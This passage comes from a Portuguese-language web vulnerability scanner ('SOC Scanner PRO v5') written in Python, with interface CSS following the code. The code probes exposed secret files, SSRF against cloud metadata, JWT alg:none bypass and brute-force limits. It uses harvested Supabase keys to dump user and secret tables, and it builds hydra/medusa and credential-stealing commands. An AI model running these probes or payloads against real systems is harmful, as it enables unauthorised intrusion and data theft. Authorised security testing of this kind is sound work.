            if methods_found:
                pocs['http_methods']={'success':True,'output':str(len(methods_found))+' metodos perigosos confirmados activos!','proofs':methods_found}
            else:
                pocs['http_methods']={'success':False,'output':'Metodos perigosos bloqueados.','proofs':[]}
        except Exception as e: pocs['http_methods']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 7: Info Leakage — headers e stack
        self.log('PoC: Info Leakage...','info')
        try:
            r=self.get(self.base)
            leaked_info=[]
            if r:
                for h in ['Server','X-Powered-By','Via','X-Generator','X-Runtime','X-AspNet-Version']:
                    v=r.headers.get(h,'')
                    if v: leaked_info.append({'header':h,'value':v,'impact':'Fingerprinting — atacante conhece versao exacta para procurar CVEs especificos\nEx: '+h+'='+v+' -> pesquisar "'+v+' CVE" no NVD/Shodan','curl_poc':'curl -I '+self.base+' | grep -i "'+h.lower()+'"'})
            if leaked_info:
                pocs['info_leakage']={'success':True,'output':'Stack tecnologica exposta via headers HTTP!\n'+'\n'.join(x['header']+': '+x['value'] for x in leaked_info),'proofs':leaked_info}
            else:
                pocs['info_leakage']={'success':False,'output':'Headers de stack nao expostos.','proofs':[]}
        except Exception as e: pocs['info_leakage']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 8: Ficheiros Sensiveis — conteudo real
        self.log('PoC: Ficheiros Sensiveis...','info')
        try:
            sensitive_found=[]
            targets=[
                ('/.env',['DB_PASSWORD','SECRET_KEY','API_KEY','AWS_SECRET','DATABASE_URL','APP_KEY','STRIPE_KEY','SENDGRID','REDIS_PASSWORD']),
                ('/.git/config',['[core]','[remote','url =','[branch']),
                ('/phpinfo.php',['PHP Version','Server API','php.ini']),
                ('/wp-config.php',['DB_PASSWORD','DB_NAME','AUTH_KEY','table_prefix']),
                ('/config.php',['password','database','host','user']),
                ('/actuator/env',['systemProperties','propertySources','password','secret']),
                ('/actuator/mappings',['mappings','routes','endpoints']),
                ('/swagger.json',['swagger','paths','definitions','info']),
                ('/openapi.json',['openapi','paths','components']),
                ('/server-status',['Apache','requests currently','Total accesses']),
            ]
            for path,indicators in targets:
                try:
                    r=self.get(self.base+path)
                    if r and r.status_code==200:
                        content=r.text[:1000]
                        matched=[i for i in indicators if i.lower() in content.lower()]
                        if matched:
                            safe=re.sub(r'(password|secret|key|token|api_key|stripe|sendgrid|aws)\s*[=:]\s*[^\n\r"\'&\s]{4,}',r'\1=***CENSURADO***',content,flags=re.IGNORECASE)
                            sensitive_found.append({'path':path,'matched_indicators':matched,'content_preview':safe[:500],'size':len(r.content),'impact':'Ficheiro sensivel publicamente acessivel!\nIndicadores: '+', '.join(matched),'curl_poc':'curl '+self.base+path})
                            self.log('[CRITICAL] '+path+' exposto! Indicadores: '+', '.join(matched),'crit')
                except: pass
            if sensitive_found:
                pocs['sensitive_files']={'success':True,'output':str(len(sensitive_found))+' ficheiros criticos expostos!','proofs':sensitive_found}
            else:
                pocs['sensitive_files']={'success':False,'output':'Ficheiros sensiveis protegidos.','proofs':[]}
        except Exception as e: pocs['sensitive_files']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 9: TLS Downgrade
        self.log('PoC: TLS Downgrade...','info')
        try:
            tls_found=[]
            if hasattr(ssl,'TLSVersion'):
                for name,ver in [('TLSv1.0',getattr(ssl.TLSVersion,'TLSv1',None)),('TLSv1.1',getattr(ssl.TLSVersion,'TLSv1_1',None))]:
                    if not ver: continue
                    try:
                        ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                        ctx.maximum_version=ver; ctx.minimum_version=ver
                        with ctx.wrap_socket(socket.create_connection((self.host,443),timeout=4),server_hostname=self.host) as s:
                            cipher=s.cipher()
                            tls_found.append({'protocol':name,'cipher':cipher[0] if cipher else 'N/A','impact':'Servidor aceita '+name+' — vulneravel a POODLE/BEAST/downgrade attacks\nAtacante pode interceptar trafico HTTPS em redes inseguras','openssl_poc':'openssl s_client -connect '+self.host+':443 -tls1\n# Se conectar = vulneravel!','curl_poc':'curl --tls-max 1.0 https://'+self.host+' -v 2>&1 | grep "SSL connection"'})
                            self.log('[HIGH] '+name+' aceite pelo servidor!','high')
                    except: pass
            if tls_found:
                pocs['tls_downgrade']={'success':True,'output':'Protocolos TLS inseguros aceites: '+', '.join(f['protocol'] for f in tls_found),'proofs':tls_found}
            else:
                pocs['tls_downgrade']={'success':False,'output':'Servidor rejeita protocolos TLS inseguros. TLS correctamente configurado.','proofs':[]}
        except Exception as e: pocs['tls_downgrade']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 10: Rate Limit / Brute Force
        self.log('PoC: Rate Limit / Brute Force...','info')
        try:
            rl_found=[]
            for path in ['/login','/api/login','/auth','/signin','/wp-login.php','/administrator/']:
                url=self.base+path; codes=[]; times=[]
                import time
                for i in range(30):
                    try:
                        t0=time.time()
                        r=requests.post(url,json={'username':'admin','password':'pass'+str(i)},data={'username':'admin','password':'pass'+str(i),'user':'admin','pass':'pass'+str(i)},verify=False,timeout=4,allow_redirects=False)
                        codes.append(r.status_code); times.append(round(time.time()-t0,2))
                        if r.status_code in (429,403): break
                    except: break
                if codes and not any(c in (429,403) for c in codes):
                    rl_found.append({'endpoint':path,'requests_sent':len(codes),'status_codes':list(set(codes)),'avg_response':round(sum(times)/len(times),2) if times else 0,'impact':'Brute-force ilimitado — '+str(len(codes))+' tentativas de login sem bloqueio\nAtacante pode testar milhares de passwords automaticamente','hydra_poc':'hydra -l admin -P /usr/share/wordlists/rockyou.txt '+self.host+' http-post-form "'+path+':username=^USER^&password=^PASS^:Invalid"\n\n# Com medusa:\nmedusa -h '+self.host+' -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:'+path,'curl_poc':'# Testar manualmente:\nfor i in $(seq 1 20); do\n  curl -s -o /dev/null -w "%{http_code}" -X POST '+self.base+path+' -d "username=admin&password=test$i"\n  echo " tentativa $i"\ndone'})
                    self.log('[CRIT] Sem rate limit em '+path+' — '+str(len(codes))+' pedidos aceites','crit')
            if rl_found:
                pocs['rate_limit']={'success':True,'output':str(len(rl_found))+' endpoints sem rate limiting!','proofs':rl_found}
            else:
                pocs['rate_limit']={'success':False,'output':'Rate limiting activo em todos os endpoints testados.','proofs':[]}
        except Exception as e: pocs['rate_limit']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 11: DNS Zone Transfer
        self.log('PoC: DNS Zone Transfer...','info')
        try:
            zt_found=[]
            import dns.zone,dns.query
            try:
                ns_ans=dns.resolver.resolve(self.host,'NS',lifetime=5)
                ns_list=[str(r) for r in ns_ans]
                for ns in ns_list[:4]:
                    try:
                        nc=ns.rstrip('.')
                        z=dns.zone.from_xfr(dns.query.xfr(nc,self.host,timeout=8))
                        if z:
                            records=[]
                            for name_r,node in list(z.nodes.items())[:25]:
                                records.append(str(name_r)+'.'+self.host)
                            zt_found.append({'nameserver':nc,'records_count':len(list(z.nodes.items())),'sample_records':records[:20],'impact':'Zone Transfer permite mapear TODA a infraestrutura:\n- Todos os subdominios\n- IPs internos\n- Servidores de mail\n- Hosts internos','dig_poc':'dig axfr '+self.host+' @'+nc+'\n\n# Resultado: '+str(len(list(z.nodes.items())))+' registos expostos!'})
                            self.log('[CRITICAL] Zone Transfer via '+nc+'!','crit')
                    except: pass
            except: pass
            if zt_found:
                pocs['dns_zone_transfer']={'success':True,'output':'Zone Transfer POSSIVEL! '+str(sum(x["records_count"] for x in zt_found))+' registos expostos!','proofs':zt_found}
            else:
                pocs['dns_zone_transfer']={'success':False,'output':'Zone Transfer bloqueado em todos os nameservers.','proofs':[]}
        except Exception as e: pocs['dns_zone_transfer']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 12: SSRF
        self.log('PoC: SSRF...','info')
        try:
            ssrf_found=[]
            ssrf_params=['?url=','?redirect=','?link=','?src=','?next=','?path=','?image=','?fetch=','?load=','?uri=','?host=','?page=']
            ssrf_targets=['http://169.254.169.254/latest/meta-data/','http://169.254.169.254/latest/user-data/','http://metadata.google.internal/computeMetadata/v1/','http://localhost/','http://127.0.0.1/']
            for param in ssrf_params:
                for target in ssrf_targets[:2]:
                    try:
                        r=self.get(self.base+param+urllib.parse.quote(target))
                        if r and r.status_code==200 and any(x in r.text for x in ['ami-id','instance-id','computeMetadata','iam/','hostname']):
                            ssrf_found.append({'param':param,'target':target,'response_preview':r.text[:300],'impact':'SSRF confirmado — acesso a metadata de cloud!\nPode expor credenciais AWS/GCP IAM','curl_poc':'curl "'+self.base+param+urllib.parse.quote(target)+'"','js_poc':'fetch("'+self.base+param+'http://169.254.169.254/latest/meta-data/iam/security-credentials/")\n.then(r=>r.text()).then(t=>console.log("AWS creds:",t))'})
                            self.log('[CRITICAL] SSRF confirmado em '+param,'crit')
                    except: pass
            if ssrf_found:
                pocs['ssrf']={'success':True,'output':'SSRF CONFIRMADO! Acesso a metadata cloud!','proofs':ssrf_found}
            else:
                pocs['ssrf']={'success':False,'output':'Sem SSRF obvio detectado.','proofs':[]}
        except Exception as e: pocs['ssrf']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 13: Subdomain Takeover
        self.log('PoC: Subdomain Takeover...','info')
        try:
            takeover_sigs={
                'github.io':"There isn't a GitHub Pages site here.",
                'heroku.com':'No such app','amazonaws.com':'NoSuchBucket',
                'azurewebsites.net':'404 Web Site not found',
                'netlify.com':'Not Found','surge.sh':'project not found',
                'fastly.net':'Fastly error','wpengine.com':'The site you were looking for',
                'shopify.com':'Sorry, this shop is currently unavailable',
            }
            takeover_found=[]
            try:
                ca=dns.resolver.resolve(self.host,'CNAME',lifetime=5)
                for rd in ca:
                    cn=str(rd.target).rstrip('.')
                    for svc,sig in takeover_sigs.items():
                        if svc in cn:
                            try:
                                r=self.get('https://'+self.host)
                                if r and sig.lower() in r.text.lower():
                                    takeover_found.append({'subdomain':self.host,'cname':cn,'service':svc,'signature':sig,'impact':'Subdomain Takeover — atacante pode reclamar '+cn+'\ne controlar completamente '+self.host})
                                    self.log('[CRITICAL] Subdomain Takeover possivel!','crit')
                            except: pass
            except: pass
            if takeover_found:
                pocs['subdomain_takeover']={'success':True,'output':'Subdomain Takeover POSSIVEL!','proofs':takeover_found}
            else:
                pocs['subdomain_takeover']={'success':False,'output':'Sem indicadores de subdomain takeover.','proofs':[]}
        except Exception as e: pocs['subdomain_takeover']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        vuln_count=sum(1 for v in pocs.values() if v.get('success'))
        self.log('PoCs concluidos: '+str(vuln_count)+'/'+str(len(pocs))+' vulnerabilidades confirmadas!','crit' if vuln_count>3 else 'high' if vuln_count>0 else 'ok')
        self.results['poc']=pocs

    def scan_jwt_supabase(self):
        self.log('A cacar JWT e credenciais Supabase...','section')
        findings={'jwt_tokens':[],'supabase_urls':[],'supabase_keys':[],'supabase_probes':[],'vulnerabilities':[],'sourcemaps':[],'jwks':[]}
        JWT_RE=re.compile(r'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}')
        SUPA_URL_RE=re.compile(r'https://([a-z0-9]{20})\.supabase\.co',re.I)
        SUPA_KEY_RE=re.compile(
            r'(?:SUPABASE_ANON_KEY|SUPABASE_SERVICE_ROLE_KEY|SUPABASE_SERVICE_KEY|'
            r'NEXT_PUBLIC_SUPABASE_ANON_KEY|VITE_SUPABASE_ANON_KEY|EXPO_PUBLIC_SUPABASE_ANON_KEY|'
            r'supabaseKey|anon_key|service_role_key|anonKey|serviceRoleKey|'
            r'SUPABASE_KEY|PUBLIC_SUPABASE_ANON_KEY)\s*[=:(,]\s*["\']?'
            r'(eyJ[A-Za-z0-9_-]{40,}\.[A-Za-z0-9_-]{40,}\.[A-Za-z0-9_-]{10,})["\']?',re.I)
        seen=set()
        def decode_jwt(token):
            try:
                p=token.split('.')[1].replace('-','+').replace('_','/')
                p+='='*(4-len(p)%4)
                return json.loads(base64.b64decode(p).decode('utf-8','ignore'))
            except: return {}
        def extract_all(content,source):
            for m in JWT_RE.finditer(content):
                t=m.group(0)
                if t in seen: continue
                seen.add(t); pl=decode_jwt(t)
                findings['jwt_tokens'].append({'token':t[:80]+'...','source':source,'payload':pl,'role':pl.get('role',pl.get('sub','N/A')),'exp':pl.get('exp','N/A'),'iss':pl.get('iss','N/A')})
                self.log('JWT em '+source[:40]+' role='+str(pl.get('role','?')),'crit')
            for m in SUPA_URL_RE.finditer(content):
                u=m.group(0)
                if u not in findings['supabase_urls']:
                    findings['supabase_urls'].append(u); self.log('Supabase URL: '+u,'crit')
            for m in SUPA_KEY_RE.finditer(content):
                k=m.group(1)
                if k and k not in findings['supabase_keys']:
                    findings['supabase_keys'].append(k); pl=decode_jwt(k)
                    self.log('Supabase KEY! role='+str(pl.get('role','?')),'crit')
        # HTML principal
        self.log('A verificar HTML e JS inline...','info')
        r=self.get(self.base)
        if r: extract_all(r.text,'HTML:'+self.base)
        # JS files do Katana + paths comuns
        js_urls=list({u for u in self.results.get('katana',{}).get('urls',[]) if '.js' in u.lower() and not u.endswith('.json')})
        for p in ['/static/js/main.js','/assets/index.js','/app.js','/bundle.js','/_next/static/chunks/main.js','/dist/main.js','/js/app.js']:
            js_urls.append(self.base+p)
        self.log('A analisar '+str(min(len(js_urls),25))+' ficheiros JS...','info')
        def scan_js(url):
            try:
                r2=self.get(url,t=8)
                if r2 and r2.status_code==200: extract_all(r2.text[:250000],url)
            except: pass
        with ThreadPoolExecutor(max_workers=10) as ex:
            list(ex.map(scan_js,js_urls[:25]))
        # .env e configs
        for p in ['/.env','/.env.local','/.env.production','/.env.staging','/.env.development','/supabase/config.toml','/config/supabase.js']:
            try:
                r3=self.get(self.base+p)
                if r3 and r3.status_code==200: extract_all(r3.text,p)
            except: pass
        # Source maps
        self.log('A verificar source maps...','info')
        for p in ['/static/js/main.js.map','/bundle.js.map','/app.js.map','/dist/main.js.map','/_next/static/chunks/main.js.map']:
            try:
                r4=self.get(self.base+p)
                if r4 and r4.status_code==200 and 'sources' in r4.text:
                    findings['sourcemaps'].append({'path':p,'size':len(r4.content),'note':'Source map exposto — codigo-fonte original acessivel'})
                    self.log('Source map EXPOSTO: '+p,'high')
                    extract_all(r4.text[:300000],p+' (sourcemap)')
            except: pass
        # JWKS
        self.log('A verificar JWKS...','info')
        for p in ['/.well-known/jwks.json','/auth/v1/jwks','/api/auth/jwks','/.well-known/openid-configuration']:
            try:
                r5=self.get(self.base+p)
                if r5 and r5.status_code==200:
                    try:
                        d=r5.json()
                        if 'keys' in d or 'issuer' in d:
                            findings['jwks'].append({'path':p,'data':str(d)[:300]}); self.log('JWKS exposto: '+p,'high')
                    except: pass
            except: pass
        # Auth endpoints
        self.log('A testar endpoints auth por JWTs...','info')
        for p in ['/auth/v1/token','/api/auth/session','/api/user','/api/me','/auth/session','/api/v1/auth/token']:
            try:
                r6=self.get(self.base+p)
                if r6 and r6.status_code in (200,401,403): extract_all(r6.text,p)
            except: pass
        # JWT alg:none vuln
        self.log('A testar JWT alg:none...','info')
        alg_none='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.'
        for p in ['/api/user','/auth/v1/user','/api/me','/api/v1/user','/api/profile']:
            try:
                r7=self.sess.get(self.base+p,headers={'Authorization':'Bearer '+alg_none},timeout=6,verify=False)
                if r7 and r7.status_code==200 and len(r7.text)>10:
                    findings['vulnerabilities'].append({'type':'JWT alg:none bypass','endpoint':p,'status':r7.status_code,'response_preview':r7.text[:200],'severity':'critical','impact':'JWT aceita alg:none — bypass total de autenticacao sem assinatura valida','curl_poc':'curl -H "Authorization: Bearer '+alg_none+'" '+self.base+p})
                    self.log('[CRITICAL] JWT alg:none aceite em '+p+'!','crit'); break
            except: pass
        # Supabase API probe
        if findings['supabase_urls'] and findings['supabase_keys']:
            supa_url=findings['supabase_urls'][0]; supa_key=findings['supabase_keys'][0]
            self.log('A probar API Supabase com key encontrada...','section')
            hdrs={'apikey':supa_key,'Authorization':'Bearer '+supa_key}
            for tbl in ['users','profiles','user_profiles','accounts','members','customers','orders','secrets','tokens','api_keys','config','settings','passwords']:
                try:
                    r8=requests.get(supa_url+'/rest/v1/'+tbl,headers=hdrs,params={'limit':5},timeout=6,verify=False)
                    if r8.status_code==200:
                        data=r8.json()
                        if isinstance(data,list) and data:
                            findings['supabase_probes'].append({'table':tbl,'rows':len(data),'sample':str(data[0])[:300],'severity':'critical','impact':'Tabela '+tbl+' acessivel com anon key — '+str(len(data))+' registos expostos'})
                            self.log('[CRITICAL] Supabase /'+tbl+' exposto! '+str(len(data))+' rows','crit')
                except: pass
            try:
                r9=requests.get(supa_url+'/auth/v1/admin/users',headers=hdrs,timeout=6,verify=False)
                if r9.status_code==200:
                    data=r9.json(); users=data.get('users',data) if isinstance(data,dict) else data
                    if users:
                        findings['supabase_probes'].append({'table':'auth.users (ADMIN)','rows':len(users) if isinstance(users,list) else 1,'sample':str(users[0] if isinstance(users,list) else users)[:300],'severity':'critical','impact':'auth/admin/users acessivel — lista de TODOS os utilizadores exposta!'})
                        self.log('[CRITICAL] Supabase auth admin exposto!','crit')
            except: pass
        tj=len(findings['jwt_tokens']); ts=len(findings['supabase_urls']); tk=len(findings['supabase_keys']); tp=len(findings['supabase_probes'])
        if tj+ts+tk==0: self.log('Sem JWT ou Supabase encontrados','ok')
        else: self.log('JWT: '+str(tj)+' | Supabase URLs: '+str(ts)+' | Keys: '+str(tk)+' | Tabelas: '+str(tp),'crit' if tk or tp else 'high')
        self.results['jwt_supabase']=findings

    def score(self):
        s=100; r=self.results
        s-=len(r.get('headers',{}).get('missing',[]))*5
        s-=len(r.get('headers',{}).get('leaked',[]))*8
        s-=sum(1 for p in r.get('ports',{}).get('open',[]) if p in DANGEROUS_PORTS)*10
        s-=sum(1 for p in r.get('paths',[]) if p.get('status')==200)*15
        if not r.get('dns',{}).get('dnssec'): s-=5
        if not r.get('dns',{}).get('SPF'): s-=5
        if not r.get('dns',{}).get('DMARC'): s-=5
        if r.get('dns',{}).get('zone_transfer'): s-=20
        tls=r.get('tls',{})
        if 'error' in tls: s-=20
        days=tls.get('cert_days_left',999)
        if days<7: s-=20
        elif days<30: s-=8
        nb=len(r.get('ua_blocking',{}).get('not_blocked',[])); tot=r.get('ua_blocking',{}).get('total',1)
        s-=int((nb/tot)*20) if tot else 0
        for v in r.get('cors',{}).values():
            if v.get('acao')=='*': s-=15; break
        s-=sum(1 for v in r.get('rate_limit',{}).values() if not v.get('limited'))*8
        if not r.get('injection',{}).get('waf_detected',True): s-=10
        fp=r.get('fingerprint',{})
        if fp.get('git_exposed'): s-=25
        if fp.get('env_exposed'): s-=25
        nuc=r.get('nuclei',{})
        s-=nuc.get('critical',0)*20; s-=nuc.get('high',0)*10
        poc=r.get('poc',{})
        s-=sum(10 for v in poc.values() if v.get('success'))
        s=max(0,min(100,s))
        grade='A' if s>=85 else 'B' if s>=70 else 'C' if s>=55 else 'D' if s>=40 else 'F'
        self.results['score']={'value':s,'grade':grade}
        self.log('SCORE: '+str(s)+'/100 | NOTA: '+grade,'section')
        return s,grade

    def run(self):
        self.emit('scan_start',{'target':self.target})
        try:
            self.parse()
            steps=[
                (self.dns,'DNS'),
                (self.ports,'Portas'),
                (self.tls,'TLS'),
                (self.headers,'Headers'),
                (self.paths,'Paths'),
                (self.ua_block,'Scanners'),
                (self.rate_limit,'Rate Limit'),
                (self.cors,'CORS'),
                (self.methods,'Metodos'),
                (self.fingerprint,'Fingerprint'),
                (self.waf,'WAF'),
                (self.scan_subdomains,'Subdominios'),
                (self.scan_katana,'Katana Crawl'),
                (self.scan_nuclei,'Nuclei CVE'),
                (self.scan_jwt_supabase,'JWT/Supabase'),
                (self.run_poc,'Provas de Conceito'),
            ]
            for i,(fn,name) in enumerate(steps):
                self.emit('progress',{'step':i+1,'total':len(steps),'name':name,'pct':int(i/len(steps)*100)})
                fn()
            sc,grade=self.score()
            self.emit('scan_done',{'results':self.results,'score':sc,'grade':grade,'target':self.target})
        except Exception as e:
            self.log('ERRO: '+str(e),'crit')
            self.emit('scan_error',{'error':str(e)})

HTML=r"""<!DOCTYPE html>
<html lang="pt"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOC Scanner PRO v5</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
:root{--bg:#020a0f;--bg2:#040e15;--bg3:#071520;--bd:#0d3a5c;--ac:#00d4ff;--ac2:#00ff88;--rd:#ff3355;--or:#ff8800;--yl:#ffcc00;--gn:#00ff88;--dm:#3a6080;--tx:#b8d4e8;--pu:#aa44ff}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--tx);font-family:'Share Tech Mono',monospace;min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(0,212,255,.02) 40px),repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(0,212,255,.02) 40px)}
.wrap{max-width:1500px;margin:0 auto;padding:20px;position:relative;z-index:1}
header{text-align:center;padding:28px 0 18px;border-bottom:1px solid var(--bd);margin-bottom:18px}
header::after{content:'';display:block;width:200px;height:2px;background:linear-gradient(90deg,transparent,var(--ac),transparent);margin:0 auto;transform:translateY(1px)}
.logo{font-family:'Rajdhani',sans-serif;font-size:2.6rem;font-weight:700;background:linear-gradient(135deg,var(--ac),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:.1em}
.sub{font-size:.63rem;color:var(--dm);letter-spacing:.3em;margin-top:4px;text-transform:uppercase}
.pill{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:20px;font-size:.62rem;border:1px solid;margin-bottom:10px}
.pill.ok{border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.06);color:var(--gn)}
.pill.err{border-color:rgba(255,51,85,.3);background:rgba(255,51,85,.06);color:var(--rd)}
.pill.wait{border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.06);color:var(--ac)}
.dot{width:6px;height:6px;border-radius:50%;background:currentColor}
.pulse{animation:pulse .8s infinite alternate}
@keyframes pulse{from{opacity:.2}to{opacity:1}}
.ibox{background:var(--bg2);border:1px solid var(--bd);border-radius:6px;padding:16px;margin-bottom:12px}
.ibox label{display:block;font-size:.62rem;color:var(--ac);letter-spacing:.2em;text-transform:uppercase;margin-bottom:7px}
.irow{display:flex;gap:8px;flex-wrap:wrap}
#ti{flex:1;min-width:180px;background:var(--bg3);border:2px solid var(--dm);border-radius:4px;padding:12px 14px;color:var(--tx);font-family:inherit;font-size:.9rem;outline:none;transition:border-color .2s}
#ti:focus{border-color:var(--ac)}
#ti::placeholder{color:var(--dm)}
#btn-scan{background:linear-gradient(135deg,#004d66,#007799);border:2px solid var(--ac);border-radius:4px;padding:0 28px;color:var(--ac);font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:700;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;min-height:46px;transition:all .2s}
#btn-scan:hover:not([disabled]){background:linear-gradient(135deg,#007799,#00aacc);box-shadow:0 0 22px rgba(0,212,255,.4)}
#btn-scan[disabled]{opacity:.35;cursor:not-allowed}
.sbar{background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:9px 12px;margin-bottom:10px;display:none;align-items:center;gap:10px}
.sbar.on{display:flex}
.spin{animation:spin 1.2s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.stx{font-size:.74rem;color:var(--ac);flex:1;overflow:hidden;white-space:nowrap}
.strack{flex:0 0 160px;background:var(--bg3);border:1px solid var(--bd);border-radius:2px;height:5px;overflow:hidden}
.sfill{height:100%;width:0;border-radius:2px;transition:width .4s;background:linear-gradient(90deg,var(--ac),var(--ac2))}
.spct{font-size:.63rem;color:var(--dm);min-width:32px;text-align:right}
.tabs{display:flex;gap:3px;flex-wrap:wrap}
.tab{padding:7px 14px;border:1px solid var(--bd);border-bottom:none;border-radius:4px 4px 0 0;cursor:pointer;font-family:'Rajdhani',sans-serif;font-size:.74rem;font-weight:600;letter-spacing:.05em;text-transform:uppercase;color:var(--dm);background:var(--bg2);transition:all .2s;user-select:none}
.tab.s{color:var(--ac);border-color:var(--ac);background:var(--bg3)}
.tab.p{color:var(--rd);border-color:var(--rd);background:var(--bg3)}
.tab.n{color:var(--or);border-color:var(--or);background:var(--bg3)}
.tab.k{color:var(--gn);border-color:var(--gn);background:var(--bg3)}
.tab.b{color:var(--pu);border-color:var(--pu);background:var(--bg3)}
.tab.j{color:#ff6b35;border-color:#ff6b35;background:var(--bg3)}
.tc{display:none;border:1px solid var(--bd);border-radius:0 6px 6px 6px;padding:12px;background:var(--bg3)}
.tc.on{display:block}
.grid{display:grid;grid-template-columns:1fr 340px;gap:12px}
@media(max-width:900px){.grid{grid-template-columns:1fr}}
.sc{background:var(--bg2);border:1px solid var(--bd);border-radius:6px;padding:16px;text-align:center;margin-bottom:10px;display:none}
.ring{width:90px;height:90px;margin:0 auto 8px;position:relative}
.ring svg{transform:rotate(-90deg)}
.rn{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}
.rn .n{font-family:'Rajdhani',sans-serif;font-size:1.8rem;font-weight:700}
.rn .l{font-size:.5rem;color:var(--dm)}
.gv{font-family:'Rajdhani',sans-serif;font-size:2.2rem;font-weight:700;margin:3px 0}
.gd{font-size:.6rem;color:var(--dm)}
.pan{background:var(--bg2);border:1px solid var(--bd);border-radius:5px;margin-bottom:7px;overflow:hidden}
.ph{display:flex;align-items:center;gap:7px;padding:9px 12px;border-bottom:1px solid var(--bd);cursor:pointer;user-select:none}
.ph:hover{background:rgba(0,212,255,.04)}
.pt{font-family:'Rajdhani',sans-serif;font-size:.82rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--ac)}
.pct2{margin-left:auto;font-size:.58rem;padding:2px 6px;border-radius:2px;background:var(--bg3);border:1px solid var(--bd);color:var(--dm)}
.pb{padding:10px;display:none}.pb.on{display:block}
/* PoC panels */
.poc-panel{background:var(--bg2);border:1px solid rgba(255,51,85,.22);border-radius:5px;margin-bottom:8px;overflow:hidden}
.poc-ph{display:flex;align-items:center;gap:9px;padding:10px 13px;border-bottom:1px solid rgba(255,51,85,.12);cursor:pointer;user-select:none}
.poc-ph:hover{background:rgba(255,51,85,.04)}
.poc-tit{font-family:'Rajdhani',sans-serif;font-size:.86rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase}
.poc-v{color:var(--rd)}.poc-s{color:var(--gn)}
.poc-bdg{margin-left:auto;font-size:.6rem;padding:2px 9px;border-radius:2px;font-weight:700;letter-spacing:.08em}
.bdg-v{background:rgba(255,51,85,.14);border:1px solid rgba(255,51,85,.4);color:var(--rd)}
.bdg-s{background:rgba(0,255,136,.07);border:1px solid rgba(0,255,136,.3);color:var(--gn)}
.poc-body{padding:12px;display:none}.poc-body.on{display:block}
.poc-out{background:var(--bg3);border:1px solid var(--bd);border-radius:3px;padding:10px;font-size:.72rem;white-space:pre-wrap;margin-bottom:7px;max-height:160px;overflow-y:auto;line-height:1.6}
.poc-cmd{background:#050f05;border:1px solid #0c380c;border-radius:3px;padding:8px;margin:5px 0}
.poc-cmd-l{font-size:.57rem;color:#3a7a3a;letter-spacing:.14em;text-transform:uppercase;margin-bottom:2px}
.poc-cmd code{color:#00ff88;font-size:.71rem;word-break:break-all;display:block;white-space:pre-wrap}
.poc-imp{background:rgba(255,51,85,.05);border-left:3px solid var(--rd);padding:6px 10px;margin:4px 0;font-size:.71rem;color:var(--or);border-radius:0 3px 3px 0;white-space:pre-wrap}
.poc-js{background:#05050f;border:1px solid #0c0c38;border-radius:3px;padding:8px;margin:5px 0}
.poc-js-l{font-size:.57rem;color:#3a3a7a;letter-spacing:.14em;text-transform:uppercase;margin-bottom:2px}
.poc-js code{color:#88aaff;font-size:.69rem;white-space:pre;display:block;overflow-x:auto}
.poc-sum{background:rgba(255,51,85,.06);border:1px solid rgba(255,51,85,.18);border-radius:5px;padding:12px 14px;margin-bottom:10px;display:flex;align-items:center;gap:12px}
.poc-sum .big{font-family:'Rajdhani',sans-serif;font-size:2rem;font-weight:700}
.disc{background:rgba(255,136,0,.04);border:1px solid rgba(255,136,0,.16);border-radius:3px;padding:8px 12px;margin-bottom:10px;font-size:.63rem;color:var(--or);line-height:1.6}
/* Nuclei */
.sev{display:inline-block;padding:2px 7px;border-radius:3px;font-size:.59rem;font-weight:700;text-transform:uppercase;margin-right:4px}
.sev-critical{background:rgba(255,0,0,.15);border:1px solid rgba(255,0,0,.4);color:#ff4444}
.sev-high{background:rgba(255,136,0,.12);border:1px solid rgba(255,136,0,.4);color:var(--or)}
.sev-medium{background:rgba(255,204,0,.1);border:1px solid rgba(255,204,0,.3);color:var(--yl)}
.sev-low{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.2);color:var(--gn)}
.cve-tag{display:inline-block;background:rgba(170,68,255,.12);border:1px solid rgba(170,68,255,.3);color:var(--pu);font-size:.57rem;padding:1px 5px;border-radius:2px;margin:1px}
.nuc-item{border:1px solid var(--bd);border-radius:4px;padding:8px;margin-bottom:5px;background:var(--bg3)}
.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;margin-bottom:10px}
.stat-box{background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:9px;text-align:center}
.stat-num{font-family:'Rajdhani',sans-serif;font-size:1.5rem;font-weight:700}
